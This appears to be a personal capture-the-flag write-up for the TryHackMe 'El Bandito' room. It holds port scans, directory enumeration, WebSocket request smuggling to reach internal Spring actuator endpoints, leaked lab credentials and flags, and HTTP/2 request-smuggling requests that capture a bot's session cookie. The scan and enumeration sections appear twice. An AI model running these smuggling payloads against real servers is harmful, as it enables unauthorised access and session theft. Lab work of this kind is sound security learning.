+| qgEOmOmJ9Xlxpg7ETyd+h3piBtCZAQdtAeHBOOcQknERCYGYZh9dG7rNzET2Ek+b
+| 7xlKd9DYHivRAjoJnZs17qlfJNt/vYC8NK/eJpjsMwIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAHeuL
+| DWTNT+UZfRnvujyxEXUbxOyOnbXsF8pjEFkQez7MBJcpPpOh3Wyqp8CdilDfPmLc
+| 5i3yw62yrOTo0p93dY+Cq7SW5G5MABY0caGFFmsVi9G/eFs8AQt+34uWj0V0dimO
+| BdvLjfXe/q+YLfpJQgfcm6Xk32X0rOPBaE9b1uIabJUMUyq4fpDkCjhor8xV0vvu
+| 8ga4weYUAY0XJxxdPIT/VL6Y3qJooY0AQHrDsYBhogbwbCpXVuqtPgyMR2QcqRDG
+| cpjjdmLH+E5ecB7qsqRmwH1iDssf67+5/AX1pWOQI67K6UBS7PaWQAMZ7gOgq+xu
+| ptK8Vhti1lPidVjeeQ==
+|_-----END CERTIFICATE-----
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Date: Tue, 11 Feb 2025 09:36:27 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:22 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 58
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|     nothing to see <script src='/static/messages.js'></script>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:25 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 0
+|     Allow: POST, GET, OPTIONS, HEAD
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|   RTSPRequest: 
+|_    HTTP/1.1 400 Bad Request
+|_http-server-header: El Bandito Server
+631/tcp  open  ipp      syn-ack ttl 63 CUPS 2.4
+|_http-server-header: CUPS/2.4 IPP/2.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Forbidden - CUPS v2.4.7
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework
+|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
+
+
+
+-----------Enumeration on port 80
+For the moment i'm not able to access to the port 80
+https://10.10.246.149
+
+-----Port 8080 enumeration----------------
+❯ gobuster dir -u http://10.10.246.149:8080/ -w /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt  -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.246.149:8080/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+/adminnorthface       (Status: 403) [Size: 146]
+/adminonline.php      (Status: 403) [Size: 146]
+/admins.php           (Status: 403) [Size: 146]
+/adminpro.php         (Status: 403) [Size: 146]
+/adminpp              (Status: 403) [Size: 146]
+/admins               (Status: 403) [Size: 146]
+/autoconfig.php       (Status: 403) [Size: 146]
+/autoconfig           (Status: 403) [Size: 146]
+/beans                (Status: 403) [Size: 146]
+/trace                (Status: 403) [Size: 146]
+/env                  (Status: 403) [Size: 146
+/favicon.ico          (Status: 200) [Size: 946]
+/health               (Status: 200) [Size: 150]
+/info                 (Status: 200) [Size: 2]
+/token.php            (Status: 200) [Size: 8]
+/token                (Status: 200) [Size: 8]
+
+Progress: 40956 / 40958 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+so  i will go to see how the website works and check to all accessible pages.
+
+in maping we see some api routes:
+{"/webjars/**":{"bean":"resourceHandlerMapping"},"/**":{"bean":"resourceHandlerMapping"},"/**/favicon.ico":{"bean":"faviconHandlerMapping"},"{[/admin-flag],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminFlag()"},"{[/admin-creds],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminCreds()"},"{[/token]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.getBootTimeWithRandom()"},"{[/isOnline]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AppHealthController.health(java.lang.String) throws java.io.IOException"},"{[/error],produces=[text/html]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)"},"{[/error]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.util.Map<java.lang.String, java.lang.Object>> org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)"},"{[/heapdump || /heapdump.json],methods=[GET],produces=[application/octet-stream]}":{"bean":"endpointHandlerMapping","method":"public void org.springframework.boot.actuate.endpoint.mvc.HeapdumpMvcEndpoint.invoke(boolean,javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.io.IOException,javax.servlet.ServletException"},"{[/autoconfig || /autoconfig.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","m
+ethod":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/trace || /trace.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/health || /health.json],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.HealthMvcEndpoint.invoke(java.security.Principal)"},"{[/dump || /dump.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/configprops || /configprops.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/env/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EnvironmentMvcEndpoint.value(java.lang.String)"},"{[/env || /env.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/metrics/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.MetricsMvcEndpoint.value(java.lang.String)"},"{[/metrics || /metrics.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/mappings || /mappings.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object o
+rg.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/beans || /beans.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/info || /info.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"}}
+
+In /health we found:
+{"status":"UP","diskSpace":{"status":"UP","total":51963551744,"free":30980042752,"threshold":10485760},"db":{"status":"UP","database":"H2","hello":1}}
+
+in token.php we found:
+6203.885
+
+In info we don't found something.
+
+At the final we do't found something.
+
+
+================Enumeration of port 631=================
+
+When i try to acess to it i recieve an error message: Forbidden
+You cannot access this page.
+
+we will try  directory enumeration and after see if this is vulnerable to browser dsync attack.
+
+The directory enumeration failed.
+
+Now i will verify browser desync attack.
+
+fetch('http://10.10.246.149/', {
+    method: 'POST',
+    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+})
+
+Nothing i think it is not vulnrerable.
+
+-------------------------After few min 
+I asked myself if i've done good job on port 8à so i come back and try t access : https://10.10.246.149:80/
+
+Bingo i access to the page but message "Nothing here"
+
+Dp i decide to do the directory enumeration.
+Starting gobuster in directory enumeration mode
+===============================================================
+/access               (Status: 200) [Size: 4817]
+/login                (Status: 405) [Size: 153]
+/logout               (Status: 302) [Size: 189] [--> /]
+/messages             (Status: 302) [Size: 189] [--> /]
+/ping                 (Status: 200) [Size: 4]
+/save                 (Status: 405) [Size: 153]
+/static               (Status: 301) [Size: 169] [--> http://10.10.246.149/static/]
+Progress: 20478 / 20479 (100.00%)
+
+
+let us investigate directories.
+
+Only access page give us sth cool: A login page
+----------------------------------------------------------------------------------
+Recap to th box after deciding to use a domain name : bandito.thm
+
+---web sites
+https://bandito.thm:80
+http://bandito.thm:631
+http://bandito.thm:8080
+
+--------let restart buttom to up
+Access to http://bandito.thm:8080. List of directories intersting
+http://bandito.thm:8080/services.html  -->
+When we want to quit we found an url : 
+    --> http://bandito.websocket.thm
+    --> http://bandito.public.thm
+http://bandito.thm:8080/burn.html
+In this page we see a form with 2 entries
+--> token address
+--> Ammount
+http://bandito.thm:8080/token.html
+when i go there i see this value : 1252.041
+
+Now i will add the two domain i found to see what i will found.
+
+bandito.public.thm bandito.websocket.thm
+
+I found nothing but when i come on bandito.public.thm:8080 it redirect me on http://bandito.thm:8080/burn.html. So i intercept the traffic.
+
+GET /burn.html HTTP/1.1
+Host: bandito.public.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Pragma: no-cache
+Cache-Control: no-cache
+
+I think this is vulnerable to websocket request smuggling.
+let me check it is what framework
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework  <---
+I will go to search if i will found something
+https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html
+
+it have directories like /env /trace ..
+
+nothing found after
+when i was intercepting and fowarding services.html request i notice something
+
+GET /isOnline?url=http://bandito.websocket.thm HTTP/1.1
+Host: bandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://bandito.thm:8080/services.html
+Connection: keep-alive
+Priority: u=4
+
+send it to repeter to see
+modify the request but first and open port 1234 with python 
+>>python3 -m http.server 1234
+The request : i see it on the task 3 of the course https://tryhackme.com/room/wsrequestsmuggling
+
+GET /isOnline?url=http://10.11.127.125:1234 HTTP/1.1
+Host: 10.10.107.178:8080
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /env HTTP/1.1
+Host: 10.10.107.178:8080
+
+Response:
+HTTP/1.1 101 
+Server: nginx
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: application/json;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+
+c75
+{"profiles":[],"server.ports":{"local.server.port":8081},"servletContextInitParams":{},"systemProperties":{"java.runtime.name":"Java(TM) SE Runtime ...
+
+It works we have our 2 answers
+
+Now check for trace directory
+we foud sth cool
+{"method":"GET","path":"/admin-creds","headers":{"request":{"host":"0.0.0.0:8081","user-agent":"Wget","connection":"close"},"response":{"X-Application-Context":"application:8081","Content-Type":"text/plain","Content-Length":"55","Date":"Tue, 11 Feb 2025 19:31:20 GMT","Connection":"close","status":"200"}}}}
+
+{"method":"GET","path":"/admin-flag"
+
+let me check for admin-creds
+
+sername:hAckLIEN password:YouCanCatchUsInYourDreams404
+
+Now admin-flag
+THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+------------------------------------------------------------------------------------
+
+Go to found the second flag
+I take credentials found on the last tab and logged in on the website of port 80 and it works
+when we check in view-source:https://10.10.107.178:80/static/messages.js we see:
+    
+function fetchMessages() {
+    fetch("/getMessages")
+        .then((response) => {
+            if (!response.ok) {
+            throw new Error("Failed to fetch messages");
+}
+
+i think i i arrive get this file i will get all message and the flag also
+let us see the request when i wrote a message
+
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+data=yyyyazza
+
+Let us modify it as on the task 5 of room http2 request smuggling
+bar
+Host: 10.10.107.178:80
+
+GET /getMessages HTTP/1.1
+Content-Length: 300
+Host: 10.10.107.178:80
+Content-Type: application/x-www-urlencoded
+
+q=
+
+I try but nothing let us continue searching ways
+
+Request: 
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+GET /getMessages HTTP/1.1
+X: f
+
+Answer:
+
+HTTP/2 200 OK
+Date: Wed, 12 Feb 2025 08:32:40 GMT
+Content-Type: application/json
+Content-Length: 351
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+Feature-Policy: microphone 'none'; geolocation 'none';
+Age: 0
+Server: El Bandito Server
+Accept-Ranges: bytes
+
+{"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.","fff","hhh","yyyyaa","yyyyazza",null,null,null,null,null,null,null],"OLIVER":[]}
+
+
+i get it but not flag
+
+
+Wheni put this request i see something but not the flag
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 300
+Content-Type: application/x-www-form-urlencoded
+
+data=a
+
+
+
+Answer
+
+a\r\n\r\nPOST /send_message HTTP/1.1\r\nHost: 10.10.29.204:80\r\nCookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ndata=aPOST / HTTP/1.1\r\nscheme: https\r\nhost: 10.10.29.204:80\r\ncookie: session=eyJ1c"
+
+that is good sth different
+
+After oe hour searching the good request u=i finished found
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 700
+Content-Type: application/x-www-form-urlencoded
+
+data=b
+
+
+Answer:
+'bGET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "HeadlessChrome";v="122"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Linux"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}\r\nX-Forw'<---------------
+
+Wawww it was a good job
+
+Cnclusion: 
+
+
+
+
+
+
+===============EL BANDITO ROOM TRYHACKME=============
+DATE: 11-02-2025
+LINK:https://tryhackme.com/room/elbandito
+DIFFICULTY: Hard
+
+
+
+##-------Box enumerqtion----------------
+❯ sudo rustscan -a 10.10.246.149 -- -A -sV -sC -O -Pn
+[sudo] password for thierry: 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+With RustScan, I scan ports so fast, even my firewall gets whiplash 💨
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.246.149:22
+Open 10.10.246.149:80
+Open 10.10.246.149:631
+Open 10.10.246.149:8080
+
+
+PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 cb:a9:4c:96:21:ca:d3:31:02:b3:40:c4:d2:3a:c3:6f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKyb+qLA66qdat8eHZU+gr17Z4ZQyxjzU4vpgpO/DBJp/l1kGP0+xKf/xL/5vJgOw4RzJu9xgLCzPvo2HlcxAju96D8wbK7QeZEyReDgsQ2ZEonFcu3lumx037ppRJRy9j0JpLXAm3L6dmkmVVMdS7liKEwxbKpJsMtFygzD9KGGgcqsyl3ZQlnp9X6bbBH2EP3c+5oEhX6IQB4asEjCECQwfyxblkRNDqDjGwJO5uBWoAwvBIsNTkw+qbD+HK7SRs3G+qaUAmtFAIm4wxjHocTaOLeowa/vpMIw7iWtZDQpfF+mBOIg9Cd3rEnuL1/lcNFqWNY9cwEl5w/O6SCe5txs8U5+MI5/lMmuxwYpEgnl3enSLcw0tNPHo+4Zm9qbF7iFHI9bSRd+LWLOYV2JVMMLmjpLFHWY1/P57HM9JSZgWQxoUy+DgMYjMQvQqUbw4dEgOqmtI8TtJ/b+LM9JjSkBtb/d3OWbW7+IPr5ef1dRXp2Wyxq/0gRoocaTIrZOc=
+|   256 38:59:34:63:8a:a4:1d:f1:a4:3b:9d:4f:de:fc:b0:15 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDOu2xwMBU8IitX/jPW+BLZ6dXgJoi1BCKP8IQTiGjB4xVjyp1ca5i4I0SAn1HA+X6ZQQAxS4krcUh2VzvAA45w=
+|   256 16:22:76:b1:d4:04:b6:96:60:cd:3f:35:d2:f4:8b:5d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCVWLo/rLLCKzdlm8t4YNcRmNLazTWJHSkIIWRtjzx
+80/tcp   open  ssl/http syn-ack ttl 62 El Bandito Server
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-10T06:51:56
+| Not valid after:  2031-04-08T06:51:56
+| MD5:   b27d:890a:f042:b213:5197:0a59:8e7d:7032
+| SHA-1: c7ef:94a2:c156:0d67:0228:3e0e:ec9d:208b:1ef7:2610
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIURBblAejJw5ScYoNqRPbL4wjFDX0wDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMDQxMDA2NTE1NloXDTMxMDQw
+| ODA2NTE1NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEA1IGvkDTK2XXvNxpEVtjI2IaOL92aEiF6Jf7e0F5RNLa7
+| duXZ6A/R5ZAGLbiAZez8YWrcQ4kTQe6NJ+MfteA0uhoXv+I4D8ZlKPxhgRU9FKFB
+| x0LJjZLqISdw7QJSqpCd1swAtX+v9TbRrXxmoAW1G/Ym9reeJk/0DE4SZlyehrFA
+| KKbmtnxYYaGp1ntM+uPMY4jAu0YrEW99sPfYlalgPTTQB7g79Ee0QEud3+dZXKCI
+| qgEOmOmJ9Xlxpg7ETyd+h3piBtCZAQdtAeHBOOcQknERCYGYZh9dG7rNzET2Ek+b
+| 7xlKd9DYHivRAjoJnZs17qlfJNt/vYC8NK/eJpjsMwIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAHeuL
+| DWTNT+UZfRnvujyxEXUbxOyOnbXsF8pjEFkQez7MBJcpPpOh3Wyqp8CdilDfPmLc
+| 5i3yw62yrOTo0p93dY+Cq7SW5G5MABY0caGFFmsVi9G/eFs8AQt+34uWj0V0dimO
+| BdvLjfXe/q+YLfpJQgfcm6Xk32X0rOPBaE9b1uIabJUMUyq4fpDkCjhor8xV0vvu
+| 8ga4weYUAY0XJxxdPIT/VL6Y3qJooY0AQHrDsYBhogbwbCpXVuqtPgyMR2QcqRDG
+| cpjjdmLH+E5ecB7qsqRmwH1iDssf67+5/AX1pWOQI67K6UBS7PaWQAMZ7gOgq+xu
+| ptK8Vhti1lPidVjeeQ==
+|_-----END CERTIFICATE-----
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Date: Tue, 11 Feb 2025 09:36:27 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:22 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 58
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|     nothing to see <script src='/static/messages.js'></script>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:25 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 0
+|     Allow: POST, GET, OPTIONS, HEAD
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|   RTSPRequest: 
+|_    HTTP/1.1 400 Bad Request
+|_http-server-header: El Bandito Server
+631/tcp  open  ipp      syn-ack ttl 63 CUPS 2.4
+|_http-server-header: CUPS/2.4 IPP/2.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Forbidden - CUPS v2.4.7
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework
+|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
+
+
+
+-----------Enumeration on port 80
+For the moment i'm not able to access to the port 80
+https://10.10.246.149
+
+-----Port 8080 enumeration----------------
+❯ gobuster dir -u http://10.10.246.149:8080/ -w /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt  -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.246.149:8080/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+/adminnorthface       (Status: 403) [Size: 146]
+/adminonline.php      (Status: 403) [Size: 146]
+/admins.php           (Status: 403) [Size: 146]
+/adminpro.php         (Status: 403) [Size: 146]
+/adminpp              (Status: 403) [Size: 146]
+/admins               (Status: 403) [Size: 146]
+/autoconfig.php       (Status: 403) [Size: 146]
+/autoconfig           (Status: 403) [Size: 146]
+/beans                (Status: 403) [Size: 146]
